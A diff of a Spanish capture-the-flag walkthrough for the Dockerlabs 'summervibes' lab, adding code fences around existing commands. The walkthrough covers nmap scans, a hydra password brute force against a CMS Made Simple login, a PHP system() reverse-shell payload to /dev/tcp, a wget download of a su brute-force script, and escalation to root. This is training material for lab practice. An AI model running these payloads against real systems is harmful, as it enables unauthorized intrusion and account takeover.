@@ -9,12 +9,20 @@ Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)
 Sabemos la IP de la maquina víctima y ahora lo que vamos a usar es nmap para realizar un escaneo general de los puertos que tiene abiertos.
  
 Podemos usar diferentes opciones, estas son algunas para que sea rápido.
+```shell
 sudo nmap -p- -sS -sC -sV --min-rate 5000 -vvv -n -Pn 172.17.0.2
+```
+```shell
 sudo nmap -p- -sS --open --min-rate 5000 -vvv -n 172.17.0.2
+```
+```shell
 sudo nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG TodosLosPuertos
+```
+```shell
 sudo nmap -p- -sS -sC -sV --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oX Maquina-summervibes
+```
  
-
+```shell
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -29,6 +37,7 @@ PORT   STATE SERVICE REASON         VERSION
 |_http-title: Apache2 Ubuntu Default Page: It works
 MAC Address: 02:42:AC:11:00:02 (Unknown)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
 Encontramos abiertos el puerto 22 ssh y el puerto 80 http que es un servidor Apache 2.4.52.
 Abrimos el navegador y nos encontramos con la pagina por defecto de Apache.
@@ -111,13 +120,14 @@ Le preguntamos a TARS si nos puede ayudar un poco.
 Con ayuda de TARS creamos el comando y le preguntamos si está bien.
 
  
-
+```shell
 hydra -l admin -P /usr/share/wordlists/rockyou.txt  -f "http-post-form://172.17.0.2/cmsms/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect"
-
+```
  
  
-
+```shell
 [80][http-post-form] host: 172.17.0.2   login: admin   password: chocolate
+```
 
 Hemos encontrado la contraseña para el usuario admin.
 Ahora entramos en el panel y comprobamos si funcionan los exploits para este CMS Made Simple version 2.2.19 encontrados antes.
@@ -163,14 +173,16 @@ Funciona el exploit, ahora tenemos que buscar un código para introducir una rev
 
 Nos genera el código para escuchar con netcat o cualquier otra opción, en una terminal
 
+```shell
 sudo nc -lvnp 443
-
+```
  
 
 Y el código para el exploit con el reverse Shell, que se tiene que modificar algo, porque directamente no lo admite tal como lo genera.
 
+```shell
 sh -i >& /dev/tcp/172.17.0.1/443 0>&1
-
+```
  
 
 En vez de usar “sh” , vamos a usar “bash”
@@ -179,17 +191,23 @@ En vez de usar “sh” , vamos a usar “bash”
 
 Para poder leer y escribir directamente, de la otra forma no se puede.
 
+```shell
 bash -i >& /dev/tcp/172.17.0.1/443 0>&1
+```
 
 Ahora solo queda unir este código con el del exploit:
 
+```shell
 <?php echo system('id'); ?>
+```
 
 Cambiamos id por el código reverse Shell, e incluimos: bash -c “código reverse shell”
 
 Resultado:
 
+```shell
 <?php echo system('bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1" '); ?>
+```
 
 TARS nos lo puede explicar un poco por encima:
  
@@ -230,15 +248,20 @@ Descargamos el diccionario y el script en la maquina victima para después ejecu
 
 Cambiamos al directorio /tmp
 
-Usaremos: wget https://raw.githubusercontent.com/Maalfer/Sudo_BruteForce/main/Linux-Su-Force.sh
-
+Usaremos: 
+```shell
+wget https://raw.githubusercontent.com/Maalfer/Sudo_BruteForce/main/Linux-Su-Force.sh
+```
  
 
 Luego en otra terminal creamos un Servidor HHTP simple para compartir por el puerto 80 la carpeta donde está el diccionario.
 
 En una nueva terminal local, accedemos al directorio /usr/share/wordlists/
+
+```shell
 cd /usr/share/wordlists/
 sudo python3 -m http.server 80
+```
 
 
 
@@ -252,29 +275,37 @@ sudo python3 -m http.server 80
 
  
 
-Y descargamos el diccionario: wget http://172.17.0.1/rockyou.txt
+Y descargamos el diccionario:
 
+```shell
+wget http://172.17.0.1/rockyou.txt
+```
  
 
 Ahora ya podemos usar el script de fuerza bruta.
 
+```shell
 bash Linux-Su-Force.sh root rockyou.txt
-
+```
  
 
 Parece ser que la contraseña “chocolate”, se ha reutilizado, podríamos haber probado a usar la misma contraseña, y nos habríamos ahorrado el proceso de fuerza bruta.
 
 Ahora ya podemos escalar a root.
 
+```shell
 su
 whoami
-
+```
 ----------------
 root
 Hemos alcanzado el nivel de privilegios máximos en el sistema.
 
-Ahora tratamos la tty para ver la Shell mejor.	script /dev/null -c bash
+Ahora tratamos la tty para ver la Shell mejor.	
 
+```shell
+script /dev/null -c bash
+```
 
 TUTORIALES
 
